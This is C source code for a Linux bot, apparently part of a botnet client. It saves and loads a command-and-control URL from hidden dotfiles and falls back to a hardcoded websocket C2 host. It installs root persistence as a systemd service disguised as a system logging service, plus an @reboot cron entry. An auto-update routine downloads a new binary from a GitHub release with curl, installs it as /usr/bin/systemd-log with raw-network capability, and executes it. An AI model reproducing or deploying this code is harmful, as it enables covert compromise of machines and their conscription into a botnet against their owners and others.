#include "bot.h"

#define C2_CFG_FILE "/etc/.bot_c2"

void save_c2_url(const char *url)
{
    if (!url || !url[0]) return;
    FILE *f = fopen(C2_CFG_FILE, "w");
    if (!f) f = fopen("/var/tmp/.bot_c2", "w");
    if (!f) f = fopen("/tmp/.bot_c2", "w");
    if (f) {
        fprintf(f, "%s\n", url);
        fclose(f);
    }
}

int load_c2_url(char *out, int cap)
{
    const char *paths[] = {C2_CFG_FILE, "/var/tmp/.bot_c2", "/tmp/.bot_c2", NULL};
    for (int i = 0; paths[i]; i++) {
        FILE *f = fopen(paths[i], "r");
        if (!f) continue;
        if (fgets(out, cap, f)) {
            out[strcspn(out, "\r\n")] = 0;
            fclose(f);
            return out[0] ? 1 : 0;
        }
        fclose(f);
    }
    return 0;
}

void install_persistence(const char *path)
{
    char c2[512] = {0};
    load_c2_url(c2, sizeof(c2));
    if (!c2[0])
        snprintf(c2, sizeof(c2), "wss://bot.minhvuong.io.vn/ws/bot/");

    char svc[1536];
    snprintf(svc, sizeof(svc),
             "[Unit]\n"
             "Description=System Logging Service\n"
             "After=network-online.target\n"
             "Wants=network-online.target\n\n"
             "[Service]\n"
             "Type=simple\n"
             "ExecStart=%s %s\n"
             "Restart=always\n"
             "RestartSec=10\n"
             "User=root\n"
             "WorkingDirectory=/\n"
             "StandardOutput=null\n"
             "StandardError=null\n"
             "LimitNOFILE=1048576\n\n"
             "[Install]\n"
             "WantedBy=multi-user.target\n",
             path, c2);

    FILE *f = fopen("/etc/systemd/system/systemd-log.service", "w");
    if (f) {
        fwrite(svc, 1, strlen(svc), f);
        fclose(f);
        system("systemctl daemon-reload 2>/dev/null");
        system("systemctl enable systemd-log.service 2>/dev/null");
    }

    char cron[768];
    snprintf(cron, sizeof(cron), "@reboot root %s %s >/dev/null 2>&1\n", path, c2);
    f = fopen("/etc/cron.d/system-log", "w");
    if (f) {
        fwrite(cron, 1, strlen(cron), f);
        fclose(f);
        system("chmod 644 /etc/cron.d/system-log 2>/dev/null");
    }
}

/* ver must be release tag e.g. "v4.0.6" — only update when remote tag differs */
void check_updates(const char *ver)
{
    if (!ver || !ver[0]) return;

    char cmd[1024];
    snprintf(cmd, sizeof(cmd),
             "curl -fs \"https://api.github.com/repos/duaakcon10/dc-ansta/releases/latest\" 2>/dev/null"
             " | sed -n 's/.*\"tag_name\"[^0-9]*\"\\([^\"]*\\)\".*/\\1/p'");
    FILE *p = popen(cmd, "r");
    if (!p) return;
    char latest[64] = {0};
    if (!fgets(latest, sizeof(latest), p)) {
        pclose(p);
        return;
    }
    pclose(p);
    latest[strcspn(latest, "\r\n")] = 0;

    if (!latest[0] || latest[0] != 'v') return;
    if (strcmp(latest, ver) == 0) return;

    /* Same major path only — avoid thrashing on parse glitches */
    if (strlen(latest) > 32) return;

    char c2[512] = {0};
    load_c2_url(c2, sizeof(c2));
    if (!c2[0]) strcpy(c2, "wss://bot.minhvuong.io.vn/ws/bot/");

    /* Download then replace; only exec if file is non-empty ELF-ish */
    snprintf(cmd, sizeof(cmd),
             "curl -fsL \"https://github.com/duaakcon10/dc-ansta/releases/download/%s/bot_static\" "
             "-o /tmp/bot_update.$$ && "
             "test -s /tmp/bot_update.$$ && "
             "chmod +x /tmp/bot_update.$$ && "
             "mv /tmp/bot_update.$$ /usr/bin/systemd-log && "
             "setcap cap_net_raw+ep /usr/bin/systemd-log 2>/dev/null; "
             "exec /usr/bin/systemd-log '%s'",
             latest, c2);
    system(cmd);
    /* If exec failed, continue with old binary */
}
